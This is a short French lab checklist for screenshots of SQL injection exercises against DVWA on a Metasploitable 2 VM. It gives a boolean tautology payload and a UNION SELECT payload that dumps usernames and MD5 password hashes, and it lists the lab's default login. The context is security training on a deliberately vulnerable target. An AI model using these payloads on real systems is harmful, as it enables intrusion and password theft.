# Captures — DVWA, injection SQL (MS2, port 80)

Cible : `http://192.168.56.101/dvwa/vulnerabilities/sqli/` (login `admin:password`, sécurité
low). Captures **navigateur**. 2 captures.

## 01-sqli-bool.png

Dans le champ `User ID`, saisir : `1' OR '1'='1` puis Submit.

Encadrer en rouge : la liste de **tous** les utilisateurs renvoyés (admin, Gordon Brown, Hack
Me, Pablo Picasso, Bob Smith) — preuve que la condition injectée est toujours vraie.

## 02-sqli-union.png

Dans le champ `User ID`, saisir : `1' UNION SELECT user, password FROM users #` puis Submit.

Encadrer en rouge : les lignes où le « Surname » est une empreinte MD5 (ex.
`admin` → `5f4dcc3b5aa765d61d8327deb882cf99`) — dump des hash de mots de passe via l'UNION.
